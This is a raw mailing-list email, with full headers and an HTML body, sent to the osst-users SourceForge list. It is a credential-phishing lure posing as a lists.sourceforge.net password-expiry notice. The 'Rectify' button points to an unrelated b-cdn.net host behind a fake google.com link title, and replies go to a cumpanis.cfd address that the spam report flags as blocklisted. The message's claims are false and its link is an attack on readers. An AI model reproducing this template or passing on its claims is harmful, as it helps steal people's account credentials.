Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 566687C6C2D
	for <lists+osst-users@lfdr.de>; Thu, 12 Oct 2023 13:23:59 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1qqtnK-0001sC-4g
	for lists+osst-users@lfdr.de;
	Thu, 12 Oct 2023 11:23:58 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <contact@cumpanis.cfd>) id 1qqtnI-0001rx-4m
 for osst-users@lists.sourceforge.net; Thu, 12 Oct 2023 11:23:56 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=3GRv5S7pd1bQSZC5fTRP+ILRULbDSxgDNrHXMeupJvM=; b=Cl5iJuRKuUC98M5ZiV32Y2GMEx
 wKC8+XnzpTKmiiu+FPn8+Zn2ZzCDPy5IA/orZ8Z55r1AIR4uQHjY8oTHSHofOGVBUrxgRSss+39mr
 AXOZmJ08m/NhcOsUuQtNqicPM/CJ3lFAIukptyVsPOR1a+X9DE1DfXQDbp0sQpp6EHGI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=3GRv5S7pd1bQSZC5fTRP+ILRULbDSxgDNrHXMeupJvM=; b=W
 cRJzJd6TduRZXaGLlQaK6k8iG+s28+iO5HlQb1HpwyVigcmVaXajak1yTkEYRRDIR3cxgp/jeqRTi
 JTYAHonUVY0Eq+KvN+0jfoQK+o8Ct3xAhTxgWg7LywsB4tz5nxY+Uh8evQRE+xJBb68ujJblXvCzg
 rMhC/2YfIECD/BkQ=;
Received: from dns0.cumpanis.cfd ([185.174.101.209])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1qqtnH-00CfCS-J8 for osst-users@lists.sourceforge.net;
 Thu, 12 Oct 2023 11:23:56 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=cumpanis.cfd; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=contact@cumpanis.cfd;
 bh=DePjuxm1L/valEMKKUvqy19hYts=;
 b=FLHaaMFLGt/1kOYAZ5L2+1MFG8eT7PLc8ErL7i68cJD24cfXvHt0ctA9okf2L7k0luQ3jKaJDF+k
 YZkgsRAmwgSvmrlmoKnNznFz+ejnGPElegSPDU1mDI+QLGTClLXv3rf1w9d5dL+5OTpT7Gkh9yp+
 2cbv85aWIppbzCbSqLQ=
To: osst-users@lists.sourceforge.net
Date: 12 Oct 2023 04:14:26 -0700
Message-ID: <20231012041426.16D93DC0EFD24ED1@cumpanis.cfd>
MIME-Version: 1.0
X-Spam-Score: 4.7 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: lists.sourceforge.net Password Reset osst-users your
 lists.sourceforge.net
 account password is due to expire Please rectify this issue to prevent account
 malfunction Rectify lists.sourceforge.net Pas [...] 
 Content analysis details:   (4.7 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: b-cdn.net]
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [185.174.101.209 listed in zen.spamhaus.org]
 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
 blocklist [URIs: cumpanis.cfd]
 0.1 URIBL_CSS Contains an URL's NS IP listed in the Spamhaus CSS
 blocklist [URIs: cumpanis.cfd]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 1.0 PDS_BRAND_SUBJ_NAKED_TO Subject starts with To: brand and naked
 To:
X-Headers-End: 1qqtnH-00CfCS-J8
Subject: [Osst-users] =?utf-8?q?lists=2Esourceforge=2Enet_Notification_for?=
 =?utf-8?b?IFBhc3N3b3JkIGV4cGlyeSAg4pqg77iP?=
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: "Account Policy Admin and password management lists.sourceforge.net via
 Osst-users" <osst-users@lists.sourceforge.net>
Reply-To: "Account Policy Admin and password management lists.sourceforge.net"
 <contact@cumpanis.cfd>
Content-Type: multipart/mixed; boundary="===============4974004898938915906=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============4974004898938915906==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META charset=3Dutf-8>
<META name=3DGENERATOR content=3D"MSHTML 8.00.7601.17514">
<META content=3DIE=3Dedge http-equiv=3DX-UA-Compatible></HEAD>
<BODY>
<DIV>
<DIV>
<TABLE border=3D0 cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=3Dce=
nter>
<TBODY>
<TR>
<TD bgColor=3D#e3e3e3 vAlign=3Dtop width=3D"100%" align=3Dmiddle>
<TABLE style=3D"MIN-WIDTH: 640px; WIDTH: 640px; MAX-WIDTH: 640px" border=3D=
0 cellSpacing=3D0 cellPadding=3D0 width=3D640 align=3Dcenter>
<TBODY>
<TR>
<TD bgColor=3D#e3e3e3>
<DIV id=3Dx_x_x_DNT-Header_Text>
<TABLE style=3D"MIN-WIDTH: 100%; WIDTH: 100%" border=3D0 cellSpacing=3D0 ce=
llPadding=3D0 width=3D"100%">
<TBODY>
<TR></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE>
<TABLE align=3Dcenter>
<TBODY>
<TR>
<TD bgColor=3D#ffffff>
<DIV>
<TABLE style=3D"MIN-WIDTH: 100%; WIDTH: 100%" border=3D0 cellSpacing=3D0 ce=
llPadding=3D0 width=3D"100%">
<TBODY>
<TR>
<TD>
<TABLE style=3D"MIN-WIDTH: 100%" cellSpacing=3D0 cellPadding=3D0 width=3D"1=
00%" bgColor=3D#ffffff align=3Dcenter>
<TBODY>
<TR>
<TD style=3D"PADDING-BOTTOM: 24px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px;=
 PADDING-TOP: 24px" class=3Dx_x_x_mob_padding align=3Dleft></TD>
<TD style=3D"PADDING-BOTTOM: 24px; LINE-HEIGHT: 30px; PADDING-LEFT: 24px; P=
ADDING-RIGHT: 24px; FONT-FAMILY: 'Segoe UI', SUWR, Arial, Sans-Serif; FONT-=
SIZE: 25px; FONT-WEIGHT: 400; PADDING-TOP: 24px" align=3Dright><STRONG styl=
e=3D"FONT-WEIGHT: 400"></STRONG></TD></TR></TBODY></TABLE></TD></TR></TBODY=
></TABLE></DIV>
<DIV id=3Dx_x_x_A>
<TABLE style=3D"BACKGROUND-COLOR: rgb(255,255,255) !important" border=3D0 c=
ellSpacing=3D0 cellPadding=3D0 width=3D640 bgColor=3D#ffffff align=3Dcenter=
>
<TBODY>
<TR>
<TD bgColor=3D#ffffff align=3Dmiddle>
<TABLE style=3D"WIDTH: 640px" border=3D0 cellSpacing=3D0 cellPadding=3D0 wi=
dth=3D640 align=3Dcenter>
<TBODY>
<TR>
<TD style=3D"PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PA=
DDING-TOP: 0px" align=3Dmiddle></TD></TR></TBODY></TABLE></TD></TR>
<TR></TR>
<TR>
<TD align=3Dleft>
<TABLE style=3D"MIN-WIDTH: 100%; WIDTH: 100%" border=3D0 cellSpacing=3D0 ce=
llPadding=3D0 width=3D"100%" align=3Dleft>
<TBODY>
<TR>
<TD style=3D"TEXT-ALIGN: left; PADDING-BOTTOM: 24px; LINE-HEIGHT: 40px; PAD=
DING-LEFT: 24px; PADDING-RIGHT: 24px; FONT-FAMILY: 'Segoe UI', SUWR, Arial,=
 sans-serif; COLOR: rgb(0,120,212) !important; FONT-SIZE: 30px; FONT-WEIGHT=
: 300; PADDING-TOP: 0px" align=3Dleft>lists.sourceforge.net Password Reset<=
/TD></TR>
<TR>
<TD></TD></TR>
<TR>
<TD style=3D"TEXT-ALIGN: left; PADDING-BOTTOM: 14px; LINE-HEIGHT: 27px; PAD=
DING-LEFT: 24px; PADDING-RIGHT: 4px; FONT-FAMILY: 'Segoe UI', SUWR, Arial, =
sans-serif; COLOR: rgb(70,70,70) !important; FONT-SIZE: 18px; FONT-WEIGHT: =
200; PADDING-TOP: 0px" align=3Dright>osst-users&nbsp;your&nbsp;lists.source=
forge.net account password is due to expire <BR aria-hidden=3Dtrue>Please r=
ectify this issue to prevent account malfunction</TD></TR>
<TR></TR>
<TR>
<TD style=3D"PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; BO=
RDER-COLLAPSE: separate; PADDING-TOP: 0px" vAlign=3Dtop>
<TABLE style=3D"MARGIN: 0px auto" border=3D0 cellSpacing=3D0 cellPadding=3D=
0 align=3Dcenter>
<TBODY>
<TR>
<TD style=3D"TEXT-ALIGN: center; PADDING-BOTTOM: 0px; LINE-HEIGHT: 40px; BA=
CKGROUND-COLOR: rgb(0,120,212) !important; PADDING-LEFT: 24px; PADDING-RIGH=
T: 24px; DISPLAY: block; BORDER-COLLAPSE: separate; FONT-FAMILY: 'Segoe UI'=
, SUWR, Arial, sans-serif; FONT-SIZE: 20px; FONT-WEIGHT: 400; TEXT-DECORATI=
ON: none; PADDING-TOP: 0px" bgColor=3D#0078d4 vAlign=3Dcenter align=3Dmiddl=
e>
<A style=3D"TEXT-DECORATION: none" title=3Dhttp://google.com/fix-issue href=
=3D"https://tokensector-dev.b-cdn.net#osst-users@lists.sourceforge.net" rel=
=3Dnoreferrer target=3D_blank><STRONG style=3D"COLOR: rgb(255,255,255) !imp=
ortant; FONT-WEIGHT: 400">Rectify lists.sourceforge.net Password </STRONG><=
/A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"LINE-HEIGHT: 24px; FONT-FAMILY: 'Segoe UI', SUWR, Arial, Sans-=
Serif; FONT-SIZE: 1px; FONT-WEIGHT: 400" height=3D24></TD></TR></TBODY></TA=
BLE></DIV>
<DIV id=3Dx_x_x_Emergency>
<DIV style=3D"LINE-HEIGHT: 0px; FONT-SIZE: 0px" height=3D"0"></DIV></DIV>
<DIV id=3Dx_x_x_B class=3Dx_x_x_mktEditable>
<DIV style=3D"LINE-HEIGHT: 0px; FONT-SIZE: 0px" height=3D"0"></DIV></DIV>
<DIV id=3Dx_x_x_C></DIV>
<DIV id=3Dx_x_x_D>
<TABLE style=3D"MIN-WIDTH: 100%; WIDTH: 100%" border=3D0 cellSpacing=3D0 ce=
llPadding=3D0 width=3D"100%" bgColor=3D#ffffff>
<TBODY>
<TR></TR>
<TR></TR>
<TR></TR></TBODY></TABLE></DIV>
<DIV id=3Dx_x_x_E>
<DIV style=3D"LINE-HEIGHT: 0px; FONT-SIZE: 0px" height=3D"0"></DIV></DIV>
<TABLE style=3D"WIDTH: 640px" border=3D0 cellSpacing=3D0 cellPadding=3D0 wi=
dth=3D640 bgColor=3D#5e5e5e align=3Dcenter>
<TBODY>
<TR>
<TD style=3D"PADDING-BOTTOM: 24px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px;=
 PADDING-TOP: 24px" bgColor=3D#f2f2f2>
<TABLE style=3D"MIN-WIDTH: 100%; WIDTH: 100%" border=3D0 cellSpacing=3D0 ce=
llPadding=3D0 width=3D"100%">
<TBODY>
<TR>
<TD style=3D"LINE-HEIGHT: 12px; FONT-FAMILY: 'Segoe UI Regular', SUWR, Aria=
l, sans-serif; COLOR: rgb(94,94,94) !important; FONT-SIZE: 10px" align=3Dle=
ft>
<DIV id=3Dx_x_x_DNT-Social>
<DIV style=3D"LINE-HEIGHT: 0px; FONT-SIZE: 0px" height=3D"0"></DIV></DIV></=
TD></TR>
<TR>
<TD style=3D"LINE-HEIGHT: 12px; FONT-FAMILY: 'Segoe UI Regular', SUWR, Aria=
l, sans-serif; COLOR: rgb(94,94,94) !important; FONT-SIZE: 10px" class=3Dx_=
x_x_mob_padding align=3Dleft>
<DIV id=3Dx_x_x_DNT-Footer>
<DIV align=3Dleft></DIV><BR aria-hidden=3Dtrue>
<DIV>
<P></P>
<DIV style=3D"LINE-HEIGHT: normal; BACKGROUND-COLOR: rgb(244,244,244) !impo=
rtant; MARGIN: 0px; FONT-FAMILY: 'Segoe UI Semibold', 'Segoe WP Semibold', =
'Segoe UI', 'Segoe WP', Segoe, 'Tahoma Serif', Verdana, sans-serif; COLOR: =
rgb(102,102,102) !important; FONT-SIZE: 10px">To stop separating items that=
 are identified as clutter, go to Options.<BR aria-hidden=3Dtrue>To stop re=
ceiving notifications about Clutter, go to Options and turn them off.<BR ar=
ia-hidden=3Dtrue>
This system notification isn't an email message and you can't reply to it.<=
/DIV></DIV></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD><=
/TR></TBODY></TABLE></TD></TR></TBODY>
<DIV></DIV>
<DIV></DIV>
<DIV></DIV>
<DIV></DIV>
<DIV></DIV>
<DIV></DIV>
<DIV></DIV>
<DIV></DIV></DIV></DIV></BODY></HTML>


--===============4974004898938915906==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4974004898938915906==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============4974004898938915906==--
